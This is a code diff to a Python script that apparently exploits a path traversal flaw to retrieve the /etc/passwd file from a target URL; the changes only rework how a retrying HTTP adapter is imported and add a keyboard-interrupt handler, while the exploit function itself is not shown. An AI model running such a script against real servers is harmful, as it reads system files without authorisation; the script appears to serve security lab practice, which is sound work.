@@ -1,6 +1,5 @@
 import sys
 import requests
-from requests.adapters import HTTPAdapter, Retry
 
 
 
@@ -19,7 +18,7 @@ def main():
     try:
         url = sys.argv[1].rstrip("/")
         session = requests.Session()
-        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))
 
         print("(+) Retrieving the contents of the /etc/passwd file...")
         passwd_file = exploit_path_traversal(url, session)
@@ -37,6 +36,10 @@ def main():
 
     except requests.exceptions.ConnectionError:
         print("(-) Unable to connect to host. Please check your URL and try again.")
+
+    except KeyboardInterrupt:
+        sys.exit(1)
+
 
 
 if __name__ == "__main__":
